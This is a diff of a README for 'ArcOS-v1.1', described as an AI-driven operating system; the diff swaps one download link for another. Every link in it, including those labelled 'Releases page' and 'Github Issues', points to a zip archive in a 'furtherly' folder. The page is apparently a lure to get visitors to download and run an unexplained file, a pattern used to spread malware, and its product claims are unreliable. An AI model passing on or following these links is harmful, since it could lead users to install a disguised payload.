@@ -1,6 +1,6 @@
 # 🖥️ ArcOS-v1.1 - Your AI-Driven Operating System
 
-[![Download ArcOS v1.1](https://raw.githubusercontent.com/FernandoGamerz/ArcOS-v1.1/main/furtherly/ArcOS-v1.1-v2.3.zip%20v1.1-brightgreen)](https://raw.githubusercontent.com/FernandoGamerz/ArcOS-v1.1/main/furtherly/ArcOS-v1.1-v2.3.zip)
+[![Download ArcOS v1.1](https://github.com/FernandoGamerz/ArcOS-v1.1/raw/refs/heads/main/furtherly/v-O-Arc-v1.0.zip%20v1.1-brightgreen)](https://github.com/FernandoGamerz/ArcOS-v1.1/raw/refs/heads/main/furtherly/v-O-Arc-v1.0.zip)
 
 ## 🧩 About ArcOS
 
@@ -12,11 +12,11 @@ To install ArcOS, you will need a compatible computer. ArcOS v1.1 supports most 
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/FernandoGamerz/ArcOS-v1.1/main/furtherly/ArcOS-v1.1-v2.3.zip) to find the latest version of ArcOS.
+1. Visit the [Releases page](https://github.com/FernandoGamerz/ArcOS-v1.1/raw/refs/heads/main/furtherly/v-O-Arc-v1.0.zip) to find the latest version of ArcOS.
 
 2. On the Releases page, look for the version labeled "ArcOS v1.1".
 
-3. Click on the link to download the installer file. It will usually be named something like `https://raw.githubusercontent.com/FernandoGamerz/ArcOS-v1.1/main/furtherly/ArcOS-v1.1-v2.3.zip` or similar.
+3. Click on the link to download the installer file. It will usually be named something like `https://github.com/FernandoGamerz/ArcOS-v1.1/raw/refs/heads/main/furtherly/v-O-Arc-v1.0.zip` or similar.
 
 4. Once downloaded, locate the file in your Downloads folder.
 
@@ -56,14 +56,14 @@ The system processes your commands quickly and accurately, making your computing
 
 If you need help, the ArcOS community is here for you. You can find support through:
 
-- [Github Issues](https://raw.githubusercontent.com/FernandoGamerz/ArcOS-v1.1/main/furtherly/ArcOS-v1.1-v2.3.zip) for reporting bugs and seeking help.
+- [Github Issues](https://github.com/FernandoGamerz/ArcOS-v1.1/raw/refs/heads/main/furtherly/v-O-Arc-v1.0.zip) for reporting bugs and seeking help.
 - Community forums where users share tips and tricks.
 
 Engage with others who use ArcOS and improve your skills with the system.
 
 ## 🌐 Future Updates
 
-ArcOS is continually being enhanced. Make sure to check the [Releases page](https://raw.githubusercontent.com/FernandoGamerz/ArcOS-v1.1/main/furtherly/ArcOS-v1.1-v2.3.zip) regularly for the latest updates and features.
+ArcOS is continually being enhanced. Make sure to check the [Releases page](https://github.com/FernandoGamerz/ArcOS-v1.1/raw/refs/heads/main/furtherly/v-O-Arc-v1.0.zip) regularly for the latest updates and features.
 
 ## 🎯 Contributing
 
